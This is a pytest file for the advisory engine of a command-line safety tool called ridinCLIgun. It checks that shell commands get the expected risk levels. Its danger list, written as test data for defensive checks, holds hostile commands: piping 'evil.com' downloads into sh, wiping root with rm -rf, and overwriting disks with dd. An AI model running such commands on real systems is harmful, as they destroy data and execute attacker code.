# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 inference-garden
# ridinCLIgun — Tests for advisory engine integration

"""Pytest tests for the advisory engine + command catalog."""

import pytest

from ridincligun.advisory.engine import AdvisoryEngine
from ridincligun.advisory.models import RiskLevel


@pytest.fixture
def engine():
    return AdvisoryEngine()


# ── Dangerous commands (DANGER) ──────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -rf ~/Documents",
    "sudo rm -rf /var",
    "curl http://evil.com | sh",
    "wget http://x | bash",
    "dd of=/dev/sda",
    "dd if=/dev/zero of=/dev/disk0",
    "chmod -R 777 /",
])
def test_danger_commands(engine, cmd):
    result = engine.analyze(cmd)
    assert result.highest_risk == RiskLevel.DANGER, f"{cmd!r} not DANGER"


# ── Warning commands ─────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "chmod 777 file.txt",
    "git push --force",
    "git push -f origin main",
    "git reset --hard",
    "git reset --hard HEAD~3",
    "git clean -fd",
    "git clean -fdx",
])
def test_warning_commands(engine, cmd):
    result = engine.analyze(cmd)
    assert result.highest_risk == RiskLevel.WARNING, f"{cmd!r} not WARNING"


# ── Caution commands ─────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "python -m http.server",
    "python3 -m http.server 8080",
    "export API_KEY=abc123",
    "export TOKEN=xyz",
])
def test_caution_commands(engine, cmd):
    result = engine.analyze(cmd)
    assert result.highest_risk == RiskLevel.CAUTION, f"{cmd!r} not CAUTION"


# ── Safe commands ────────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "ls -la",
    "git status",
    "cd /tmp",
    "echo hello",
    "cat file.txt",
    "python script.py",
    "pwd",
    "whoami",
    "git log --oneline",
    "pip install requests",
    "mkdir new_folder",
    "grep -r pattern .",
    "rm file.txt",         # rm without -rf is not flagged as danger
    "git push",            # push without --force is safe
])
def test_safe_commands(engine, cmd):
    result = engine.analyze(cmd)
    assert result.is_safe, f"{cmd!r} should be safe, got {result.highest_risk.value}"


# ── Empty / whitespace ───────────────────────────────────────────

@pytest.mark.parametrize("cmd", ["", "  ", "\t"])
def test_empty_input(engine, cmd):
    result = engine.analyze(cmd)
    assert result.is_safe


# ── Result structure ─────────────────────────────────────────────

def test_result_has_warnings(engine):
    result = engine.analyze("rm -rf /")
    assert len(result.warnings) > 0
    w = result.warnings[0]
    assert w.risk == RiskLevel.DANGER
    assert w.summary  # has a summary string
    assert w.suggestion  # dangerous commands should have a suggestion


def test_result_safe_no_warnings(engine):
    result = engine.analyze("ls")
    assert result.is_safe
    assert len(result.warnings) == 0
